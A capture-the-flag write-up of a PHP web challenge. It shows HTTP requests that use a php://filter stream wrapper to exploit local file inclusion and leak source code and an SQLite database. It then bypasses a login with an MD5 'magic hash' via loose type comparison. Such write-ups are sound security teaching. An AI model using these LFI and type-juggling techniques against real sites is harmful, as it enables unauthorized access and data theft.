---
toc: true
title: MACS Web
description: MACS Web
date: 2023-11-25
author: Duc Anh Nguyen
---

## 1. [Pea Haych Pee](/image/macs_web/1700915309736.png)

The web reads the `page` parameter, fetches the file whose filename is the same as `page` value, and includes it in the response. By sending a random page name that does not exist (locally) in their server, it can be deduced that they are using php include function to add the file content to the response.

```http
GET /mainsite/?page=test.php HTTP/1.1
Host: chal2.macs.codes:4023
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Sun, 26 Nov 2023 03:45:52 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34

<br />
<b>Warning</b>:  include(test.php): failed to open stream: No such file or directory in <b>/var/www/html/mainsite/index.php</b> on line <b>14</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'test.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/mainsite/index.php
```

Use `include` to exploit the LFI vulnerability. When you use php:// with include or require, you're essentially telling PHP to treat the specified stream as if it were a file, allowing you to read from it or write to it as needed.

Read the code in index.php by sending this request:

```
GET /mainsite/?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: chal2.macs.codes:4023
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://chal2.macs.codes:4023/mainsite/index.php?page=contact
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

Source code is leaked:
```php
<?php
	include("header.php");
	$page = $_GET['page'];
	if(isset($page) && strlen("$page") !== 0) {
		while(substr_count($page, '../', 0)) {
 			$page = str_replace('../', '', $page);
		};
		while(substr_count($page, 'flag', 0)) { //you can't just include the flag you cheeky buggers, try harder!!!
			$page = str_replace('flag', '', $page);
		}
		if($page[0] === '/') {
			$page = substr($page, 1);
		}
		include("$page");
	}
	include("footer.php");
?>
```
However, there is a filter to forbid extracting the flag so I check out the header.php file. Below is a snippet.

```php
		    <?php
                    // echo '<li class="nav-item"><a href="secret_gymso_admin/index.php">Admin - Not Complete</a></li>';
    ?>
```

Read `/var/www/html/secret_gymso_admin/index.php` with stream wrappers:

```html
<form class="login100-form validate-form" method="post" action="../mainsite/login_toBeFinished.php">
	<span class="login100-form-title p-b-55">
		Login
    </span>
```

Read `/var/www/html/mainsite/login_toBeFinished.php` with stream wrappers: 

```php
<?php
	session_start();
	$username = $_POST["username"];
	$password = $_POST["password"];
	$myPDO = new PDO('sqlite:database_toBeFinished.db');
	$stmt = $myPDO->prepare("SELECT * FROM users WHERE username = ?");
	$stmt->execute(array("$username"));
	if($row = $stmt->fetch()) {
		$databasePassword = $row[1];
		if($databasePassword == md5("$password")) {
			$_SESSION['password'] = $password;
			//print_r(file_get_contents('../v/flag.php4'));
			header('Location: /secret_gymso_admin/flag.php');
		}
		else {
			header('Location: /secret_gymso_admin/index.php');
		}
	}
	else {
		header('Location: /secret_gymso_admin/index.php');
	}
?>

```

There is a database in the folder, try reading `/var/www/html/mainsite/database_toBeFinished.db` with stream wrappers, and the username and password (in MD5) are leaked:

```sqlite
joseph 0e087333482131113740957780965295
```

The code is vulnerable in its comparison between $databasePassword and md5("$password"). It uses loose type comparison and therefore it's vulnerable to [PHP Type Juggling](https://medium.com/@codingkarma/not-so-obvious-php-vulnerabilities-388a3b7bf2dc). The output of the `md5` function is a string and `$databasePassword`` value is going to be "0e087333482131113740957780965295" for user Joseph:

```php
md5(string $string, bool $binary = false): string
```

The loose type comparison is pretty funky and you can read more about it here: [PHP Loose Type](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf). Basically:

`0e08733 == 0e12345 is True`
So we have to find a password when hashed gives out a value that starts with `0e`. Consult [Magic Hash](https://github.com/spaze/hashes/blob/master/md5.md) and we know we can use a value of 240610708 for the password. Login with username joseph/ password 240610708 and we can obtain the flag. 